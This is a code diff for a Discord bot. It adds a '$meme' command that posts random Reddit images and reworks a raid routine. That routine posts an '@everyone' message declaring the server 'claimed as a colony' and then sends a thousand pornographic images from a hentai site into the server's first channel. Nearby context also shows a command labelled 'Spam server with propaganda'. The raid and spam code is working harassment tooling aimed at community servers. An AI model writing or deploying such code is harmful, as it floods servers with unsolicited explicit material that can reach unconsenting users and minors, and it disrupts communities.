@@ -31,6 +31,20 @@ async def on_message(message):
      if message.content.lower() == "$joke":
           await message.channel.send(random.choice(jokes)) #send random joke
 
+     #--Fake meme feature--
+     if message.content.lower() == "$meme":
+          memes = imagesearch.getImages("https://reddit.com/r/dankmemes") #load dankmemes hot page
+          meme = random.choice(memes) #select random image from page
+          while not meme.startswith("https://i.redd.it/"): #check it is an uploaded file and not an asset
+               meme = random.choice(memes)
+          
+          async with aiohttp.ClientSession() as session: #http stuff I don't understand
+                         async with session.get(meme) as resp:
+                            if resp.status != 200:
+                                return await channel.send('`error loading image`')
+                            data = io.BytesIO(await resp.read())
+                            await message.channel.send(file=discord.File(data, os.path.basename(meme))) #send the meme
+
      # --Spam server with propaganda--
      if message.content.lower() == "$propaganda":
           for i in range(15):
@@ -79,14 +93,17 @@ async def on_message(message):
           #-spam images-
           heinz = client.get_channel(message.guild.channels[0].id)
           await heinz.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
+
+          hentai = imagesearch.getImages("https://hentaihaven.xxx") #load hentai from hentaihaven (kill me now)
+
           for x in range(1000):
-               for y in imagesearch.getImages("https://hentaihaven.xxx"):
-                    async with aiohttp.ClientSession() as session:
-                         async with session.get(y) as resp:
-                            if resp.status != 200:
-                                return await channel.send('`error loading image`')
-                            data = io.BytesIO(await resp.read())
-                            await channel.send(file=discord.File(data, os.path.basename(y) + ".png"))
+               y = random.choice(hentai)
+               async with aiohttp.ClientSession() as session:
+                    async with session.get(y) as resp:
+                         if resp.status != 200:
+                              return await channel.send('`error loading image`')
+                         data = io.BytesIO(await resp.read())
+                         await channel.send(file=discord.File(data, os.path.basename(y)))
          
      
 @client.event
